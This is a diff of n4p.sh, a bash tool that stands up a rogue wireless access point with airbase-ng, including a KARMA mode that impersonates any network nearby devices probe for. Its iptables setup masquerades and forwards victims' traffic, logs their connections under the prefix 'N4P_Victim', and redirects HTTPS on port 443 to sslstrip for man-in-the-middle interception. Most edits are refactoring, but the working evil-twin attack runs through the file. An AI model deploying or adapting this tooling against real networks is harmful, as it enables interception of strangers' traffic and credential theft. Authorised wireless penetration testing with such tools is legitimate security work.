0.6-beta

+++ n4p.sh
@@ -5,9 +5,9 @@
 # before anything else starts happening      #
 ##############################################
 
-if [[ $(uid) != 0 ]]; then # Verify we are root if not exit
-	echo "$WARN Please Run This Script As Root or With Sudo!"
-	exit 0
+if [[ $(id -u) != 0 ]]; then # Verify we are root if not exit
+	echo "$WARN Please Run This Script As Root or With Sudo!" 1>&2
+   exit 1
 fi
 
 #retrieve absolute path structures so we can use symlinks and config files
@@ -21,8 +21,9 @@ done
 
 DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
 
+# yeah this is that help menu
 if [[ -n $1 ]]; then
-	if [[ $1 == '-h' || $1 == '--help' ]]; then # yeah this is that help menu
+	if [[ $1 == '-h' || $1 == '--help' ]]; then
 		echo -e "Useage: n4p [mode] [option] [option]
 		where: mode
 			-f 				fast setup
@@ -68,32 +69,33 @@ fi
 depends()
 {
 	IPT="/sbin/iptables"
-	RESERVD="10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 127.0.0.0/8 169.254.0.0/16"
-	DHCP="-t nat"
 	LAN2="eth1"
 	LAN="eth0"
 	WLAN="wlan0"
-	WAN="-t nat"
 	AP="at0"
 	MON="wlan0mon"
 	VPN="tun0"
 	VPNI="tap+"
+	AP_GATEWAY="10.0.0.254"
+	AP_SUBNET="255.255.255.0"
+	AP_IP="10.0.0.0"
+	AP_BROADCAST="10.0.0.255"
 	# Text color variables
 	TXT_UND=$(tput sgr 0 1)          # Underline
 	TXT_BLD=$(tput bold)             # Bold
-	BLD_RED=${txtbld}$(tput setaf 1) #  red
-	BLD_YEL=${txtbld}$(tput setaf 2) #  Yellow
-	BLD_ORA=${txtbld}$(tput setaf 3) #  orange
-	BLD_BLU=${txtbld}$(tput setaf 4) #  blue
-	BLD_PUR=${txtbld}$(tput setaf 5) #  purple
-	BLD_TEA=${txtbld}$(tput setaf 6) #  teal
-	BLD_WHT=${txtbld}$(tput setaf 7) #  white
+	BLD_RED=${txtbld}$(tput setaf 1) # red
+	BLD_YEL=${txtbld}$(tput setaf 2) # Yellow
+	BLD_ORA=${txtbld}$(tput setaf 3) # orange
+	BLD_BLU=${txtbld}$(tput setaf 4) # blue
+	BLD_PUR=${txtbld}$(tput setaf 5) # purple
+	BLD_TEA=${txtbld}$(tput setaf 6) # teal
+	BLD_WHT=${txtbld}$(tput setaf 7) # white
 	TXT_RST=$(tput sgr0)             # Reset
-	INFO=${BLD_WHT}*${TXT_RST}        # Feedback
+	INFO=${BLD_WHT}*${TXT_RST}       # Feedback
+	QUES=${BLD_BLU}?${TXT_RST}		 # Questions
 	PASS="${BLD_TEA}[${TXT_RSR}${BLD_WHT} OK ${TXT_RST}${BLD_TEA}]${TXT_RST}"
 	WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"
-	QUES=${BLD_BLU}?${TXT_RST}
-	# Start text with ^ variable and end the text with $(tput sgr0)
+	# Start text with $BLD_YEL variable and end the text with $TXT_RST
 }
 
 banner()
@@ -127,57 +129,38 @@ setupenv()
 # Use error checking for exacution of external commands and report
 step() {
     echo -n "$@"
-
-    STEP_OK=0
-    [[ -w $sessionfolder/logs ]] && echo -e $STEP_OK > $sessionfolder/logs/step.$$
 }
 
 action() {
-    # Check for `-b' argument to run command in the background.
-    #local BG=
-
-    #[[ $1 == -b ]] && { BG=1; shift; }
-    #[[ $1 == -- ]] && {       shift; }
-
-    # Run the command.
-    if [[ -z $BG ]]; then
-        "$@"
-    else
-        "$@" &
-    fi
+	STEP_OK=0
+	"$@"
 
     # Check if command failed and update $STEP_OK if so.
     local EXIT_CODE=$?
 
     if [[ $EXIT_CODE != 0 ]]; then
         STEP_OK=$EXIT_CODE
-        [[ -w $sessionfolder/logs ]] && echo $STEP_OK > $sessionfolder/logs/step.$$
-        if [[ -n $LOG_STEPS ]]; then
-            local FILE=$(readlink -m "${BASH_SOURCE[1]}")
-            local LINE=${BASH_LINENO[0]}
-            echo -e "$FILE: line $LINE: Command \`$*' failed with exit code $EXIT_CODE." >> "$LOG_STEPS"
-        fi
     fi
+
     return $EXIT_CODE
 }
 
 next() {
-    [[ -f $sessionfolder/logs/step.$$ ]] && { STEP_OK=$(< $sessionfolder/logs/step.$$); rm -f $sessionfolder/logs/step.$$; }
-    [[ $STEP_OK == 0 ]] && echo -e "$PASS   $1" || echo -e "$WARN  $1"
+    [[ $STEP_OK == 0 ]] && echo "$PASS   $1" || echo "$WARN  $1"
     return $STEP_OK
 }
 
-get_state()
+get_state() # Retrieve the state of interfaces
 {
 	STATE=$(ip addr list | grep -i $1 | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2)
 }
 
-get_inet()
+get_inet() # Retrieve the ip of the interface
 {
 	INET=$(ip addr list | grep -i $1 | grep -i inet | awk '{print $2}')
 }
 
-get_RCstatus()
+get_RCstatus() # What is the status from OpenRC of the service
 {
 	STATUS=$(/etc/init.d/net.$1 status | sed 's/* status: //g' | cut -d ' ' -f 2)
 }
@@ -189,7 +172,7 @@ settings()
 		+==============================================+
 		|           Listing Network Devices            |
 		+==============================================+${TXT_RST}"
-		action ip addr
+		ip addr
 		echo "${BLD_ORA}***************************************************************************************${TXT_RST}"
 		echo "$INFO Press Enter for defaults"
 		read -p "$QUES What is your Internet or default interface? [eth0]: " LAN
@@ -234,7 +217,8 @@ settings()
 				/etc/init.d/net.$WLAN stop
 			fi
 		fi
-		ip link set $WLAN down # No need for extra verification code just force the device down even if it's alread down
+		get_state $WLAN
+		[[ $STATE != 'DOWN' ]] && ip link set $WLAN down
 		iwconfig $WLAN mode managed #Force managed mode upon wlan because there is a glitch that can block airmon from bringing the interface up if not previously done
 		ESSID="Pentoo"
 		CHAN="1"
@@ -258,7 +242,7 @@ killemAll()
 	if [[ $BRIDGED == 'True' ]]; then
 		get_RCstatus $BRIDGE
 		if [[ $STATUS == 'started' ]]; then
-			action /etc/init.d/net.$BRIDGE stop
+			/etc/init.d/net.$BRIDGE stop
 		fi
 		get_state "$BRDIGE"
 		if [[ $STATE != 'DOWN' ]]; then
@@ -285,26 +269,20 @@ rebuild_network()
 	+==================================+${TXT_RST}"
 	read -p "$QUES Option: " MENU_REBUILD_NETWORK
 	if [[ $MENU_REBUILD_NETWORK == 1 ]]; then
-		get_RCstatus "$LAN"
-		if [[ $STATUS != 'started' ]]; then
-			get_state "$LAN"
-			if [[ $STATE == 'DOWN' ]]; then
-				ip link set $LAN up
-			fi
-			/etc/init.d/net.$LAN start
-		fi
+		local DEVICE=$LAN 
 	elif [[ $MENU_REBUILD_NETWORK == 2 ]]; then
-		get_RCstatus "$WLAN"
-		if [[ $STATUS != 'started' ]]; then
-			get_state "$WLAN"
-			if [[ $STATE == 'DOWN' ]]; then
-				ip link set $WLAN up
-			fi
-			/etc/init.d/net.$WLAN start
-		fi
+		local DEVICE=$WLAN	
 	else 
 		echo "$WARN Invalid option"
 		rebuild_network
+	fi
+	get_RCstatus "$DEVICE"
+	if [[ $STATUS != 'started' ]]; then
+		get_state "$DEVICE"
+		if [[ $STATE == 'DOWN' ]]; then
+			ip link set $DEVICE up
+		fi
+		/etc/init.d/net.$DEVICE start
 	fi
 	return 0
 }
@@ -320,27 +298,27 @@ startairbase()
 		ip link set "$WLAN" down
 	done
 
-	step "Airmon-zc comming up"
+	step "$INFO Airmon-zc comming up"
 	action airmon-zc check kill
 	action airmon-zc start $WLAN
 	next
 
 	if [[ $MENUCHOICE == 2 ]]; then
-		step "$INFO STARTING SERVICE: AIRBASE-NG"
-		action airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -v > $sessionfolder/logs/airbase-ng.log &
-		sleep 0.5 ## future put this and the next line in a more comprehensive loop
-		action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
+		step "$INFO STARTING SERVICE: AIRBASE-NG" #-Z -a -0
+		action airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
+		sleep 1.5 ## future put this and the next line in a more comprehensive loop
+		#action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
 		next
 	elif [[ $MENUCHOICE == 1 ]]; then # used elif instead of just else for more comprehensive structure so users may modify easier.
 		step "$INFO STARTING SERVICE: KARMA AIRBASE-NG"
 		action airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v > $sessionfolder/logs/airbase-ng.log &
-		sleep 0.5
-		action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
+		sleep 1.5
 		next
 	fi
 
 	echo "" # \n doesn't work through our action function so we need another echo to give a line break
 	step "$INFO Assigning IP and Route to $AP"
+	echo ""
 	get_state "$AP"
 	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
 		sleep 0.3
@@ -349,27 +327,28 @@ startairbase()
 	done
 	# setting ip and route doesn't always take, to ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
 	local CHK_IP=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
-	if [[ -n $CHK_IP && $CHK_IP != 10.0.0.254/32 ]]; then
+	if [[ -n $CHK_IP && $CHK_IP != "$AP_GATEWAY"/32 ]]; then
 		action ip addr del $CHK_IP dev $AP
 	fi
 
 	local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}')
-	if [[ -n $CHK_IP && $CHK_IP != 10.0.0.0/24  ]]; then
+	if [[ -n $CHK_IP && $CHK_IP != "$AP_IP"/24  ]]; then
 		action ip route flush $CHK_IP
 	fi
 
 	while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
 		sleep 0.3
-		action ip addr add 10.0.0.254 broadcast 10.0.0.255 dev $AP
+		action ip addr add $AP_GATEWAY broadcast $AP_BROADCAST dev $AP
 	done
 
-	while [[ -z $(route -n | grep $AP | grep 10.0.0.254 ) ]]; do
+	while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
 		sleep 0.3
-		action route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
+		action route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY
 	done
 	action route -n
 	next
 	AIRBASE="On"
+	xterm -hold -bg black -fg blue -T "Airbase logs" -geometry 90x20 -e tail -f "$sessionfolder/logs/airbase-ng.log" &>/dev/null &
 }
 #################################################################
 #################Verify our DHCP and bridge needs################
@@ -400,12 +379,13 @@ openrc_bridge()
 		fi
 	fi
 
-	get_inet "$RESP_BR_1" # This insures $RESP_BR_1 does not have an ip and then removes it if it does since the bridge handles this
+	# This insures $RESP_BR_1 & RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
+	get_inet "$RESP_BR_1"
 	if [[ -n $INET ]]; then
 		ip addr del $CHK_IP dev $RESP_BR_1
 	fi
 
-	get_inet "$RESP_BR_2" # This insures $RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
+	get_inet "$RESP_BR_2"
 	if [[ -n $INET ]]; then
 		ip addr del $CHK_IP dev $RESP_BR_2
 	fi
@@ -458,8 +438,8 @@ fbridge()
 				if [[ -z $RESP_BR_2 ]]; then # Run default check to verify what our default interface should be encase the user forgot to set this properly.
 					if [[ $AIRBASE == 'On' ]]; then
 						RESP_BR_2=$AP
-					else
-						RESP_BR_2=$WLAN 
+					#else # Enable this option for Hostapd
+					#	RESP_BR_2=$WLAN 
 					fi
 				fi
 				BRIDGED="True"
@@ -467,7 +447,7 @@ fbridge()
 			elif [[ $RESP_BR == [nN] ]]; then
 				BRIDGED="False"
 			else	
-				clear; echo "$WARN Invalid option"; fbridge
+				echo "$WARN Invalid option"; fbridge
 			fi
 		fi
 	elif [[ $BRIDGED == 'True' ]]; then # If we are here then $FAST -f was enabled with -b
@@ -475,8 +455,8 @@ fbridge()
 		RESP_BR_1=$LAN
 		if [[ -n $FAST_AIRBASE ]]; then
 			RESP_BR_2=$AP
-		elif [[ -n $FAST_HOSTAPD ]]; then # Users may run hostapd instead on their own just by running it and changing the FAST variable on line 42
-			RESP_BR_2=$WLAN
+		#elif [[ -n $FAST_HOSTAPD ]]; then # Users may run hostapd instead on their own just by running it and changing the FAST variable on line 42 to $FAST_HOSTAPD
+		#	RESP_BR_2=$WLAN
 		fi
 		openrc_bridge
 	fi
@@ -497,7 +477,9 @@ dhcp()
 			else
 				echo ""
 				step "$INFO Bringing interface $AP up"
-				action ln -s /etc/init.d/net.lo /etc/init.d/net.$AP
+				if [[ ! -e /etc/init.d/net.$AP ]]; then
+					action ln -s /etc/init.d/net.lo /etc/init.d/net.$AP
+				fi
 				action /etc/init.d/net.$AP start
 				next
 			fi
@@ -557,48 +539,42 @@ fw_redundant()
 	echo ""
 	action /etc/init.d/iptables stop
 	$IPT -F
-	$IPT $WAN -F
+	$IPT -t nat -F
 	$IPT --delete-chain
-	$IPT $WAN --delete-chain
+	$IPT -t nat --delete-chain
 	$IPT -F FORWARD
 	$IPT -t filter --flush FORWARD
 	$IPT -t filter --flush INPUT
 	next
 
 	# Set default policies for all three default chains
-	echo ""
 	step "$INFO Setting default policies"
 	action $IPT -P OUTPUT ACCEPT
 	next
 
-	echo ""
 	step "$INFO We will allow ip forwarding"
 	echo 1 > /proc/sys/net/ipv4/ip_forward
 	action $IPT -P FORWARD ACCEPT
 	next
 
 	# Enable free use of loopback interfaces
-	echo ""
 	step "$INFO  Allowing loopback devices"
 	action $IPT -A INPUT -i lo -j ACCEPT
 	action $IPT -A OUTPUT -o lo -j ACCEPT
 	next
 
 	## permit local network
-	echo ""
 	step "$INFO  Permit local network"
 	action $IPT -A INPUT -i $LAN -j ACCEPT
 	action $IPT -A OUTPUT -o $LAN -j ACCEPT
 	next
 
 	## DHCP
-	echo ""
 	step "$INFO  Allowing DHCP server"
-	action $IPT -A INPUT $WAN -p udp --sport 67 --dport 68 -j ACCEPT
+	action $IPT -A INPUT -t nat -p udp --sport 67 --dport 68 -j ACCEPT
 	next
 
 	## Allow Samba
-	echo ""
 	step "$INFO Configuring Samba"
 	action $IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
 	action $IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
@@ -611,28 +587,24 @@ fw_redundant()
 fw_services()
 {
 	## Allow DNS Server
-	echo ""
 	step "$INFO Allowing dns on port 53"
-	action $IPT -A INPUT $WAN -p udp -m udp --dport 53 -j ACCEPT
+	action $IPT -A INPUT -t nat -p udp -m udp --dport 53 -j ACCEPT
 	next
 
 	## SSH (allows SSH through firewall, from anywhere on the WAN)
-	echo ""
 	step "$INFO Allowing ssh on port 22"
-	action $IPT -A INPUT $WAN -p tcp --dport 22 -j ACCEPT
+	action $IPT -A INPUT -t nat -p tcp --dport 22 -j ACCEPT
 	next
 
 	## Web server
-	echo ""
 	step "$INFO Allowing http on port 80 and https on 443"
-	action $IPT -A INPUT $WAN -p tcp -m multiport --dports 80,443 -j ACCEPT
+	action $IPT -A INPUT -t nat -p tcp -m multiport --dports 80,443 -j ACCEPT
 	next
 }
 
 vpn_confirmed()
 {
 	#Allow TUN interface connections to OpenVPN server
-	echo ""
 	step "$INFO Allowing openVPN"
 	action $IPT -A INPUT -i $VPN -j ACCEPT
 	#allow TUN interface connections to be forwarded through other interfaces
@@ -643,8 +615,8 @@ vpn_confirmed()
 	action $IPT -A FORWARD -i $VPNI -j ACCEPT
 	next
 	# I've been called into action
-	echo ""
 	step "$INFO OpenRC now bringing up OpenVPN"
+	echo ""
 	action /etc/init.d/openvpn start
 	next
 }
@@ -658,9 +630,9 @@ fw_vpn()
 	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time"
 	read -p "$INFO Do you still want to turn on OpenVPN now? (y/n) " RESP
 	if [[ $RESP == [yY] ]]; then 
-		vpn_confirmed; 
+		vpn_confirmed
 	elif [[ $RESP != [nN] ]]; then
-		clear; echo "$WARN Bad input"
+		echo "$WARN Bad input"
 		fw_vpn
 	fi
 }
@@ -668,7 +640,6 @@ fw_vpn()
 fw_closure()
 {
 	## drop everything else arriving from WAN on local interfaces
-	echo ""
 	step "$INFO Drop everything else"
 	action $IPT -A INPUT -i $LAN -j LOG
 	action $IPT -A INPUT -i $LAN -j DROP
@@ -676,15 +647,14 @@ fw_closure()
 	#
 	# Save settings
 	#
-	echo ""
 	step "$INFO Saving settings and bringing iptables back online"
+	echo ""
 	action /etc/init.d/iptables save
 	echo ""
 	action /etc/init.d/iptables start
 	next
 
 	## list the iptables rules as confirmation
-	echo ""
 	step "$INFO Listing the iptables rules as confirmation"
 	echo ""
 	action $IPT -L -v
@@ -695,8 +665,8 @@ fw_ssl()
 	if [[ -n $FAST_SSLSTRIP ]]; then
 		echo ""
 		step "$INFO Fast mode sslstrip"
-		action $IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
-		#action $IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
+		action $IPT -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
+		#action $IPT -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
 		mitm
 		next
 	else	
@@ -726,19 +696,17 @@ fw_up()
 	#iptables -A PREROUTING -i $LAN -p tcp -j DNAT --to-destination 127.0.0.1:9050
 
 	#log all connection activity
-	echo ""
 	step "$INFO Set logging"
 	$IPT -A INPUT -i $AP -p tcp -m state --state new -j LOG --log-prefix "N4P_Victim: "
 	next
 
 	if [[ $BRIDGED != 'True' ]]; then
-		echo ""
 		step "$INFO Allowing wirless for airbase, routing $AP through $LAN be sure airbase was configured for $AP and $LAN as the output otherwise adjust these settings"
-		action $IPT $WAN -A POSTROUTING -o $LAN -j MASQUERADE
+		action $IPT -t nat -A POSTROUTING -o $LAN -j MASQUERADE
 		action $IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
 		action $IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
-		#try $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
-		#try $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
+		#action $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
+		#action $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
 		next
 	fi
 	fw_closure
